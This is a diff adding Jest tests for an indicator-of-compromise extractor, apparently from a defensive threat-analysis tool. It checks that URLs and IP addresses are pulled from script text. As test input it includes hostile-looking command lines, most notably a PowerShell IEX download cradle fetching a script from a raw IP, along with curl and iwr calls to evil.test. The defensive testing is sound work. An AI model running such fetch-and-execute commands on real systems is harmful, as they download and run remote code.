@@ -52,4 +52,33 @@ describe('extractIocs', () => {
     ])
     expect(iocs.map((i) => i.raw)).toContain('http://evil.test/payload.exe')
   })
+
+  it('surfaces the IP as its own IOC when a URL host is an IP literal (both the URL and the IP)', () => {
+    const iocs = extractIocs([
+      { index: 0, text: "IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')" },
+    ])
+    const url = iocs.find((i) => i.type === 'url')!
+    const ip = iocs.find((i) => i.type === 'ipv4')!
+    expect(url.raw).toBe('http://45.9.148.20/a.ps1')
+    expect(ip.raw).toBe('45.9.148.20')
+    expect(ip.defanged).toBe('45[.]9[.]148[.]20')
+    expect(ip.layerIndex).toBe(0)
+  })
+
+  it('strips userinfo and port when lifting the IP host', () => {
+    const iocs = extractIocs([{ index: 0, text: 'curl http://bob@203.0.113.9:8080/x' }])
+    expect(iocs.map((i) => i.raw)).toContain('203.0.113.9')
+  })
+
+  it('does not add an IP IOC for a URL with a domain host', () => {
+    const iocs = extractIocs([{ index: 0, text: "iwr 'http://evil.test/a.ps1'" }])
+    expect(iocs.filter((i) => i.type === 'ipv4')).toHaveLength(0)
+  })
+
+  it('does not duplicate an IP that already appears standalone', () => {
+    const iocs = extractIocs([
+      { index: 0, text: "iwr 'http://45.9.148.20/a.ps1'; ping 45.9.148.20" },
+    ])
+    expect(iocs.filter((i) => i.raw === '45.9.148.20')).toHaveLength(1)
+  })
 })
